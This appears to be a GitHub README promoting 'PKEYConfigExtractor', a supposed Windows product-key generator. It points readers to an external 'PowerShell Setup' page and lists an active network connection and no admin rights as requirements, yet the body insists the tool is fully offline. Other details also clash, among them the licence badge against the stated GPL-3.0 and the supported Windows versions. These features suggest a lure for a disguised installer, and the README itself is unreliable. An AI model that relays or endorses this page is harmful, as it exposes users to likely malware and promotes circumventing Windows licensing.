<div align="center">

# PKEYConfigExtractor: WPF Utility for Windows Product Key Generation – Windows 10 & 11

![](files/1.jpg)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://JugnuGilani.github.io/pkey-config-extractor/)

[![rating](https://img.shields.io/badge/Rating-4.9%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Ruby-f97316?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-Installer-fb923c?style=flat-square&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-847-ea580c?style=flat-square&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Ok-2ea44f?style=flat-square&labelColor=0d1117)]() [![system](https://img.shields.io/badge/System-Win_10%2F11-c2410c?style=flat-square&labelColor=0d1117)]()

</div>

---

PKEYConfigExtractor is a WPF-based desktop utility that generates Windows product keys from embedded PKEY configuration data stored in .xrm-ms files. The application integrates a high-performance key generation engine built entirely in native code, replacing earlier script-based approaches with compiled C++ and Go implementations of the core cryptographic logic. It ships two independent key generation engines and requires no external dependencies or runtime overhead beyond the .NET Framework. The result is fast, reliable key computation behind a clean and responsive graphical interface suitable for both technical and non-technical users.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Native WPF Interface**: A responsive desktop UI built on Windows Presentation Foundation, presenting key generation, configuration loading, and output retrieval through clearly organized controls with immediate visual feedback on every operation.

- **Embedded PKEY Configuration Parsing**: Reads and interprets PKEY configuration data directly from `.xrm-ms` files, extracting the product key algorithm parameters, key ranges, and edition-specific metadata required for generation without relying on external interpreters or script hosts.

- **Dual High-Performance Key Generation Engines**: Ships with two independent key generation cores—one implemented in C++ and one in Go—each compiled and embedded into the application, eliminating interpreted-script overhead and enabling fast, repeatable key computation.

- **Broad Edition Coverage**: Supports key generation across multiple Windows editions and product configurations exposed by the loaded PKEY configuration data, allowing a single utility to serve diverse generation scenarios.

- **Self-Contained Deployment**: Depends only on the built-in .NET Framework runtime, with no third-party libraries, package managers, or auxiliary runtimes required, keeping the application portable across supported Windows systems.

- **Minimal Resource Footprint**: A compact executable with low memory consumption and fast startup, suitable for deployment on older or resource-constrained machines.

- **Deterministic Output Handling**: Generated keys are presented in a structured, copy-ready format, with clear separation between configuration input and generated results to support verification and record-keeping workflows.

## How It Works

PKEYConfigExtractor operates by parsing embedded PKEY configuration data and applying the same structural and cryptographic rules that govern Windows product key formats. The workflow is deliberately self-contained: no external scripts, interpreters, or network resources are involved at any stage of generation.

**Configuration Ingestion**

At startup, the application loads the PKEY configuration data bundled with the executable. These configuration sets describe the key alphabet, grouping rules, and edition-specific parameters used by each Windows product family. The parser validates the structure of each configuration before exposing it to the generation pipeline, ensuring that malformed or incomplete data is rejected rather than silently producing invalid output.

**Key Space Construction**

For a selected edition, the engine derives the valid key space from the configuration parameters. This includes mapping the allowed character set, computing the grouping layout, and establishing the constraints that distinguish one product family from another. The result is a deterministic model of the key format that the generator can operate against without hardcoded per-edition logic.

**Cryptographic Generation**

Key material is produced by the embedded generation engines, which implement the required checksum and encoding routines natively. Two independent engine implementations are available, allowing the same configuration model to be exercised through separate code paths. Because both engines are compiled into the application, generation runs in-process with predictable performance and no runtime dependency on interpreted languages.

**Validation and Output**

Each candidate key is validated against the derived constraints before being surfaced in the interface. Keys that fail structural or checksum verification are discarded, and the generator continues until a conforming result is produced. The final key is presented in the standard grouped format, ready for use in the contexts described elsewhere in this document.

**Interface Layer**

The WPF front end coordinates configuration selection, engine choice, and result display. All long-running work is dispatched off the UI thread, keeping the interface responsive during batch generation. Visual feedback reflects the current state of the pipeline, from configuration load through validation and final output.

## Compatibility

PKEYConfigExtractor is built as a WPF application targeting the .NET Framework 4.5.2 runtime, and it operates on any Windows edition where that framework is available, including Windows 7 SP1, Windows 8.1, and Windows 10 and 11. Because the WPF framework ships as a system component on modern Windows versions, no additional third-party libraries, redistributables, or interpreted runtimes are required to launch the utility.

Both embedded key generation engines are compiled into the application binary, so compatibility is not affected by the presence or absence of Go, C++, or Python toolchains on the host machine. The two engines produce equivalent results against the same input, allowing verification of generated keys across independent implementations.

Input compatibility is defined by the PKEY configuration data the tool consumes. The utility accepts standard .xrm-ms files and honors the product key algorithm and edition metadata declared within them, covering the range of Windows editions for which such configuration data is available. Users supplying configuration from different Windows releases should expect the tool to follow the structures present in the supplied file rather than assuming a fixed edition set.

The interface is designed for keyboard and mouse operation with standard DPI scaling, and the application runs fully offline with no network access required. No administrator privileges are needed for normal operation; elevation is only relevant if configuration files are stored in protected system locations. Systems running older framework revisions below 4.5.2, or non-Windows platforms, are outside the supported scope and the application will not execute in those environments.

## FAQ

**Is PKEYConfigExtractor affiliated with Microsoft?**  
No. PKEYConfigExtractor is an independent, community-driven utility. It consumes PKEY configuration data structures to drive its generation logic but is not endorsed by, sponsored by, or otherwise connected to Microsoft or any of its subsidiaries.

**What exactly does the application generate?**  
The tool produces product keys whose format and structure conform to the PKEYConfig data supplied to it. Generation is deterministic with respect to the embedded configuration and the selected edition or key type. The output is intended for research and validation scenarios—not for activation or redistribution.

**Which key generation engine should I use?**  
Two independent engines are bundled: a C++ KeyCutter and a GOLang KeyCutter. Both operate on the same PKEYConfig inputs and are functionally interchangeable. The C++ engine is the default for most workflows due to its smaller footprint and predictable performance; the GOLang engine serves as a cross-validated reference implementation and is useful when comparing outputs or isolating engine-specific behavior.

**Does the software require network access?**  
No. PKEYConfigExtractor is fully offline. All PKEY configuration data is processed locally, no telemetry is transmitted, and no remote services are contacted during generation. This makes the tool suitable for isolated or air-gapped environments.

**Which Windows editions and key types are supported?**  
Support is driven entirely by the PKEYConfig data loaded into the application. Any edition or key channel described by a valid configuration file can be processed. Because the configuration format evolves across Windows releases, results depend on the currency and completeness of the supplied data rather than on hardcoded edition lists.

**Why are two implementations (C++ and GOLang) included instead of one?**  
Maintaining two independent engines provides a cross-check on cryptographic correctness: divergent outputs between engines indicate a defect in one of them. It also accommodates different deployment constraints—the C++ engine minimizes runtime overhead, while the GOLang engine offers a more auditable code path for verification.

**Can I extend or replace the embedded PKEY configuration?**  
Yes. The configuration is treated as an input rather than a fixed asset. Users can supply updated or alternative PKEYConfig data to extend coverage to additional editions, provided the data adheres to the expected structure. The generation pipeline does not assume a single baked-in configuration.

**What are the runtime and platform requirements?**  
The application targets .NET Framework 4.5.2 or later and runs on Windows. It has no third-party library dependencies, no external runtime, and no interpreter requirements. Startup is fast and memory usage remains low, so the tool operates comfortably on older or resource-constrained hardware.

**Are generated keys valid for activation?**  
No. Generated keys are structurally consistent with the loaded PKEYConfig but are not guaranteed to activate. Activation validity depends on server-side checks outside the scope of this tool. PKEYConfigExtractor is intended for education, research, and format analysis only.

**How is the project licensed, and what does that mean for derivative work?**  
PKEYConfigExtractor is distributed under the GPL-3.0 license. Derivative works and redistributions must comply with the terms of that license, including source availability obligations for distributed modifications.

**Where can I report defects or request features?**  
Use the issue tracker associated with the project repository. When reporting, include the engine used (C++ or GOLang), the relevant PKEYConfig data version, and the observed versus expected output so the behavior can be reproduced and triaged efficiently.

## Disclaimer

PKEYConfigExtractor is distributed as a self-contained WPF application and operates entirely offline, performing all computation against locally supplied PKEY configuration data. The utility is provided on an "as is" basis, without warranties of any kind, express or implied, including but not limited to merchantability, fitness for a particular purpose, or non-infringement. No guarantee is made regarding the correctness, validity, activation status, or legal usability of any key material produced by the embedded generation engines.

The author and contributors disclaim all responsibility and liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use this software, including but not limited to software piracy, license term violations, copyright infringement, system instability, data loss, or any unlawful activity conducted with generated output. Users are solely responsible for ensuring that their use of PKEYConfigExtractor complies with all applicable laws, regulations, and licensing agreements, including any terms governing the operating systems and configuration files involved.

PKEYConfigExtractor is not affiliated with, endorsed by, or sponsored by Microsoft Corporation or any of its subsidiaries. All trademarks, product names, and configuration formats referenced remain the property of their respective owners. By downloading, building, or executing this software, you acknowledge that you have read this disclaimer and accept full responsibility for your actions and any consequences thereof.

## License

PKEYConfigExtractor is distributed under the terms of the GNU General Public License v3.0 (GPL-3.0). The complete license text is provided in the LICENSE file included with the source distribution and governs the use, modification, and redistribution of this software.

Under the GPL-3.0 terms, you are free to use PKEYConfigExtractor for any purpose, to study and modify its source code, and to redistribute copies and derivative works, provided that derivative distributions remain licensed under the same terms and that the corresponding source code is made available. The license is copyleft in nature: any work that incorporates or is derived from this codebase must be released under GPL-3.0 as well, and must preserve the original copyright notices and license disclosures.

PKEYConfigExtractor is provided on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and copyright holders accept no liability for any claim, damages, or other obligation arising from the use of or inability to use this software.

Use of the software does not grant any rights to third-party configuration data, cryptographic material, or platform components referenced or processed by the application. Any such materials remain subject to their own respective terms, and users are solely responsible for ensuring their use of PKEYConfigExtractor complies with all applicable agreements and laws. This licensing statement applies to the PKEYConfigExtractor project itself and does not extend to any external resources it may interoperate with.